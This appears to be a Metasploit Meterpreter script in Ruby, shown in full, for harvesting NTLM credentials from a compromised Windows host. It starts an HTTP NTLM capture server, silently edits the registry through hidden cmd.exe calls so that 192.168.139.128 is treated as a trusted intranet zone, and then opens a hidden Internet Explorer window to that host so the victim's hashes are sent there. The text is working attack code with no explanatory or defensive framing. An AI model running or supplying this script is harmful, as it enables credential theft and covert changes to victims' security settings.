mul = client.framework.auxiliary.create("server/capture/http_ntlm")

mul.datastore['URIPATH'] = "/"

mul.datastore['JTRFILE'] = "/tmp/jtrfile"

mul.run_simple(
	'RunAsJob' => true
)

client.sys.process.execute("cmd.exe /c echo Windows Registry Editor Version 5.00 > test.reg", nil, {'Hidden' => 'true'})

client.sys.process.execute("cmd.exe /c echo [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Ranges\\Range10] >> test.reg", nil, {'Hidden' => 'true'})

client.sys.process.execute("cmd.exe /c echo \"http\"\=dword\:00000001 >> test.reg", nil, {'Hidden' => 'true'})

client.sys.process.execute("cmd.exe /c echo \"\:Range\"\=\"192.168.139.128\" >> test.reg", nil, {'Hidden' => 'true'})

client.sys.process.execute("cmd.exe /c regedit.exe \-s test.reg", nil, {'Hidden' => 'true'})


client.sys.process.execute("c:\\program files\\internet explorer\\iexplore.exe -new http://192.168.139.128:8080/" , nil, {'Hidden' => 'true'})
